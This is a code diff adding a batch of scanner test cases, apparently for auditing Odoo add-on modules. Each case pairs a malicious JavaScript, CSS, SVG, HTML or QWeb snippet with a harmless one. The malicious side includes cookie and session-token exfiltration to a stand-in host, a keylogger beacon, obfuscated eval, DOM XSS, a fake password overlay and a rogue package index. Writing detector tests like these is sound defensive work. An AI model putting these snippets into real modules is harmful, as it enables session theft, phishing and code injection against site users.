@@ -541,3 +541,279 @@ def test_testcase_import_ok_run_override_not():
     }
     assert not _sev(ok, "test-tamper")
     assert "high" in _sev(bad, "test-tamper")
+
+
+# ---- batch 3: JS / CSS / markup / inert files / QWeb probe classes (positive, negative) ----
+
+C = lambda s, n="static/src/a.scss": {n: s}  # noqa: E731
+M = lambda s, n="static/src/a.svg": {n: s}  # noqa: E731
+U = lambda n, b: {n: b}  # noqa: E731
+
+B3 = [
+    (
+        "script-text",
+        J(
+            "const s=document.createElement('scr'+'ipt'); s.textContent=atob(x); document.body.appendChild(s)"
+        ),
+        ("js-eval", "high"),
+        J("const s=document.createElement('div'); s.textContent=x"),
+    ),
+    (
+        "postmessage",
+        J("window.parent.postMessage(document.cookie,'*')"),
+        ("js-postmessage", "high"),
+        J("window.parent.postMessage({a:1}, location.origin)"),
+    ),
+    (
+        "wasm",
+        J("WebAssembly.instantiateStreaming(fetch('/x/a.wasm'))"),
+        ("js-eval", "high"),
+        J("const w = 1"),
+    ),
+    (
+        "patch-session",
+        J(
+            "import {patch} from '@web/core/utils/patch';import {session} from '@web/session';patch(session,{get uid(){return 2}})"
+        ),
+        ("js-patch-core", "high"),
+        J(
+            "import {patch} from '@web/core/utils/patch';import {FormController} from '@web/views/form/form_controller';patch(FormController.prototype,{x(){}})"
+        ),
+    ),
+    (
+        "proto",
+        J("Object.prototype.isAdmin=true"),
+        ("js-prototype-tamper", "high"),
+        J("const o = {}; o.isAdmin = true"),
+    ),
+    (
+        "fetch-hook",
+        J("window.fetch = function(){}"),
+        ("js-network-hook", "high"),
+        J("const f = window.fetch"),
+    ),
+    (
+        "keylogger",
+        J("document.addEventListener('keydown', e => navigator.sendBeacon('/l', e.key))"),
+        ("js-keylogger", "high"),
+        J("document.addEventListener('keydown', e => console.log(e.key))"),
+    ),
+    (
+        "dom-xss",
+        J("document.body.innerHTML = location.hash.slice(1)"),
+        ("js-dom-xss", "high"),
+        J("document.body.textContent = location.hash"),
+    ),
+    (
+        "join-eval",
+        J("window[['ev','al'].join('')]('1')"),
+        ("js-eval", "high"),
+        J("const s = ['a','b'].join('')"),
+    ),
+    (
+        "reflect-cookie",
+        J("fetch('/x',{body:Reflect.get(document,'cookie')})"),
+        ("js-cookie-leak", "high"),
+        J("fetch('/x',{body:Reflect.get(o,'name')})"),
+    ),
+    (
+        "owl-t-on",
+        J(
+            "import {Component,xml} from '@odoo/owl';\nclass A extends Component{static template=xml`<div t-on-click='() => window[\"ev\"+\"al\"](props.c)'/>`}"
+        ),
+        ("js-eval", "high"),
+        J(
+            "import {Component,xml} from '@odoo/owl';\nclass A extends Component{static template=xml`<div t-on-click='() => this.save()'/>`}"
+        ),
+    ),
+    (
+        "owl-href",
+        J(
+            "import {Component,xml} from '@odoo/owl';\nclass A extends Component{static template=xml`<a t-att-href='props.url'>x</a>`}"
+        ),
+        ("owl-url-attr", "medium"),
+        J(
+            "import {Component,xml} from '@odoo/owl';\nclass A extends Component{static template=xml`<a t-attf-href='/web#id={{props.id}}'>x</a>`}"
+        ),
+    ),
+    (
+        "ts-namespace",
+        J("namespace N { export const e = 1; }", "static/src/a.ts"),
+        ("web-unaudited", "high"),
+        J("enum E {A}\nexport const x: number = 1;", "static/src/a.ts"),
+    ),
+    (
+        "tsx-cookie",
+        J("const a = <img src={'//e.v/'+document.cookie}/>;", "static/src/a.tsx"),
+        ("js-cookie-leak", "high"),
+        J("const a = <img src={'/web/image/1'}/>;", "static/src/a.tsx"),
+    ),
+    (
+        "sourcemap",
+        J("var a=1;\n//# sourceMappingURL=https://e.v/a.map"),
+        ("js-external-request", "medium"),
+        J("var a=1;\n//# sourceMappingURL=a.js.map"),
+    ),
+    (
+        "markup-data",
+        J("import {markup} from '@odoo/owl'; const x = markup(this.props.record.data.body)"),
+        ("js-markup", "medium"),
+        J("import {markup} from '@odoo/owl'; const x = markup('<b>x</b>')"),
+    ),
+    (
+        "scss-interp",
+        C("$h:'https://e.v';a{background:url(#{$h}/a)}"),
+        ("css-external-url", "medium"),
+        C("$h:'/x/static';a{background:url(#{$h}/a.png)}"),
+    ),
+    (
+        "scss-concat",
+        C("$h:'ht'+'tps://e.v/a';a{background:url($h)}"),
+        ("css-external-url", "medium"),
+        C("$h:'/x'+'/a.png';a{background:url($h)}"),
+    ),
+    (
+        "scss-mixin",
+        C("@mixin m($u){background:url($u)}a{@include m('https://e.v/x')}"),
+        ("css-external-url", "medium"),
+        C("@mixin m($u){background:url($u)}a{@include m('/x/a.png')}"),
+    ),
+    (
+        "scss-load-css",
+        C("@use 'sass:meta';a{@include meta.load-css('https://e.v/x')}"),
+        ("css-external-import", "high"),
+        C("@use 'sass:meta';a{@include meta.load-css('x/b')}"),
+    ),
+    (
+        "less-import-css",
+        C("@import (css) url('https://e.v/x.css');", "static/src/a.less"),
+        ("css-external-import", "high"),
+        C("@import (css) url('/x/static/a.css');", "static/src/a.less"),
+    ),
+    (
+        "css-overlay",
+        C(
+            ".o_x::before{content:'Session expired, enter password at e.v';position:fixed;inset:0;z-index:99999}",
+            "static/src/a.css",
+        ),
+        ("css-overlay", "medium"),
+        C(".o_x::before{content:'';position:fixed;inset:0;z-index:99999}", "static/src/a.css"),
+    ),
+    (
+        "svg-feimage",
+        M(
+            "<svg xmlns='http://www.w3.org/2000/svg'><filter><feImage href='https://e.v/a'/></filter></svg>"
+        ),
+        ("markup-external-resource", "medium"),
+        M("<svg xmlns='http://www.w3.org/2000/svg'><filter><feImage href='#a'/></filter></svg>"),
+    ),
+    (
+        "html-object",
+        M("<html><object data='https://e.v/x.swf'></object></html>", "static/src/a.html"),
+        ("markup-plugin", "high"),
+        M("<html><p>x</p></html>", "static/src/a.html"),
+    ),
+    (
+        "html-malformed",
+        M("<scr<script>ipt>alert(1)</script>", "static/src/a.html"),
+        ("markup-script", "high"),
+        M("<html><p>script</p></html>", "static/src/a.html"),
+    ),
+    (
+        "html-srcdoc",
+        M('<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>', "static/src/a.html"),
+        ("markup-script", "high"),
+        M("<html><iframe src='/x'></iframe></html>", "static/src/a.html"),
+    ),
+    (
+        "rst-raw",
+        U("README.rst", ".. raw:: html\n\n   <script>alert(1)</script>"),
+        ("doc-active-content", "medium"),
+        U("README.rst", "Title\n=====\n\ntext"),
+    ),
+    (
+        "requirements",
+        U("requirements.txt", "evilpkg==1.0\n--index-url https://e.v/simple\n"),
+        ("dependency-source", "medium"),
+        U("requirements.txt", "requests==2.31.0\n"),
+    ),
+    (
+        "png-polyglot",
+        U("static/description/icon.png", b"\x89PNG\r\n\x1a\n<script>alert(1)</script>"),
+        ("polyglot-content", "medium"),
+        U("static/description/icon.png", b"\x89PNG\r\n\x1a\n\x00\x00IHDR"),
+    ),
+    (
+        "png-fake",
+        U(
+            "static/description/icon.png",
+            b"<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'/>",
+        ),
+        ("content-mismatch", "high"),
+        U("static/description/icon.png", b"\xff\xd8\xff\xe0JFIF"),
+    ),
+    (
+        "docx-bad",
+        U("static/a.docx", b"PK\x03\x04garbage"),
+        ("content-mismatch", "medium"),
+        U("static/a.txt", b"hello"),
+    ),
+    (
+        "egg-info",
+        U("x.egg-info/entry_points.txt", "[console_scripts]\nx=os:system\n"),
+        ("packaging-metadata", "medium"),
+        U("doc/entry_points.txt", "notes"),
+    ),
+    (
+        "importmap",
+        U("static/src/importmap.json", '{"import":"https://e.v/x.js"}'),
+        ("json-external-url", "medium"),
+        U("static/src/a.json", '{"a":1}'),
+    ),
+    (
+        "qweb-tcall",
+        X("<template id='p'><t t-call='{{request.params.get(\"t\")}}'/></template>"),
+        ("qweb-dynamic-call", "high"),
+        X("<template id='p'><t t-call='web.layout'/></template>"),
+    ),
+    (
+        "qweb-token",
+        X(
+            "<template id='p'><img t-attf-src='https://e.v/?c={{request.session.session_token}}'/></template>"
+        ),
+        ("qweb-token-leak", "high"),
+        X("<template id='p'><img t-attf-src='/web/image/{{o.id}}'/></template>"),
+    ),
+    (
+        "qweb-href-req",
+        X("<template id='p'><a t-att-href='request.params.get(\"u\")'>x</a></template>"),
+        ("qweb-dynamic-url", "medium"),
+        X("<template id='p'><a t-attf-href='/shop/{{p.id}}'>x</a></template>"),
+    ),
+    (
+        "file-missing",
+        X(
+            "<record id='m' model='mail.template'><field name='name'>m</field><field name='model_id' ref='base.model_res_partner'/><field name='body_html' type='html' file='x/data/b.html'/></record>"
+        ),
+        ("data-file-unaudited", "medium"),
+        X(
+            "<record id='m' model='mail.template'><field name='name'>m</field><field name='model_id' ref='base.model_res_partner'/><field name='body_html' type='html'><p>x</p></field></record>"
+        ),
+    ),
+    (
+        "server-unlink",
+        X(
+            "<record id='s' model='ir.actions.server'><field name='name'>s</field><field name='model_id' ref='base.model_res_partner'/><field name='state'>code</field><field name='code'>records.unlink()</field></record>"
+        ),
+        ("server-action-unlink", "medium"),
+        X(
+            "<record id='s' model='ir.actions.server'><field name='name'>s</field><field name='model_id' ref='base.model_res_partner'/><field name='state'>code</field><field name='code'>records.write({'active': False})</field></record>"
+        ),
+    ),
+]
+
+
+@pytest.mark.parametrize("name,pos,want,neg", B3, ids=[b[0] for b in B3])
+def test_batch3_probe_classes(name, pos, want, neg):
+    assert want in codes(pos), name
+    assert (want[0], "high") not in codes(neg) and (want[0], want[1]) not in codes(neg), name
